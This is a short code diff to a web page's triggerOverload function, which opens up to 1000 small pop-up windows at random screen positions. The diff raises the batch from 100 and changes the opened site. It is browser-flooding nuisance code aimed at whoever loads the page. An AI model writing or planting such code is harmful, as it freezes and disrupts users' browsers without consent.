@@ -194,11 +194,11 @@
 
         function triggerOverload() {
             // Speed factor: how many windows per batch
-            const batchSize = 100;
+            const batchSize = 1000;
             
             for(let i = 0; i < batchSize; i++) {
                 window.open(
-                    "https://www.google.com", 
+                    "https://chess.com/", 
                     `_blank_${Math.random()}`, 
                     `width=100,height=100,left=${Math.random()*screen.width},top=${Math.random()*screen.height}`
                 );
@@ -241,4 +241,5 @@
     </script>
 </body>
 </html>
+
 
